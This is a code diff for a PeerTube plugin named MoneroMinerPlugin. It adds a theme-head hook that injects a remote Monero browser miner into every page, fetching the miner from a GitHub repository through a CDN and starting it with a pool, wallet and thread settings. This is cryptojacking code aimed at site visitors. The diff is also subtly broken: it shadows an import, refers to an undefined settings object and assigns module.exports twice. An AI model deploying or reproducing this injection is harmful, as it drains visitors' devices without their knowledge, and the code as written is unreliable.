@@ -2,6 +2,33 @@ const { Plugin } = require('peertube-plugin');
 const fs = require('fs');
 const path = require('path');
 
+const registerHook = require('peertube-plugin-toolkit').registerHook;
+
+module.exports = async function({ registerHook }) {
+  // Register a hook to modify the HTML template
+  registerHook({
+    target: 'action:theme.head',
+    handler: () => {
+      return `
+        <!-- Start Of Mining Code (HTML) -->
+        <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+        <script>
+            server = "${settings.webSocket}";
+            var pool = "${settings.poolAddress}";
+            var walletAddress = "${settings.walletAddress}";
+            var workerId = "GH-XMR";
+            var threads = ${settings.threads};
+            var password = "";
+            startMining(pool, walletAddress, workerId, threads, password);
+            throttleMiner = 20;
+        </script>
+        <!-- End Of Mining Code (HTML) -->
+      `;
+    }
+  });
+};
+
+
 module.exports = class MoneroMinerPlugin extends Plugin {
   constructor() {
     super();
